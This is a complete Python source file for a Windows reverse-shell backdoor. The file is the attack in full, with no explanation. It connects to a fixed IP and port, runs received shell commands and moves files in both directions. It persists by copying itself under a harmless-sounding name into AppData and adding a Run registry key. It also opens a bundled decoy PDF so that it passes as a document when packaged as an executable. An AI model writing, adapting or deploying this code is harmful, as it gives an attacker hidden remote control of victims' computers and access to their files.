#!/usr/bin/python

import socket
import subprocess, os, sys, shutil
import json, base64


class Backdoor:

    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except OSError as err:
            return "error changing directory " + str(err)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] file uploaded successfully"

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                sys.exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            elif command[0] == "upload":

                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command).decode()
            self.reliable_send(command_result)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError as err:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        try:
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
        except (subprocess.CalledProcessError, OSError):
            return " command returned error"

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\diag_helper.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v diag_helper /t REG_SZ /d "' + evil_file_location + '"',
                shell=True)


filename = sys._MEIPASS + "\\NomadBSD_Handbooklet.pdf"
subprocess.Popen(filename, shell=True)
try:
    my_backdoor = Backdoor("10.0.0.10", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()

# KeyboardInterrupt
